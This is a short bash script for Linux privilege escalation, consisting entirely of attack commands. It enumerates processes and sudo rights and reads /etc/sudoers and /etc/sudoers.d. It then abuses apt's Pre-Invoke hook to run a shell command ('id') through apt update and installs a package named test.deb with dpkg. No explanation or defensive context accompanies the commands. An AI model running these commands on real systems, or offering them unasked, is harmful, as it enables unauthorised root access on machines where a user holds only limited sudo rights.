#!/bin/bash
# -*- coding: UTF8 -*-
ps -aux
sudo -l
cat /etc/sudoers
ls /etc/sudoers.d
cat /etc/sudoers.d/*
apt update -o APT::Update::Pre-Invoke::="/bin/bash -c id"
dpkg -i test.deb
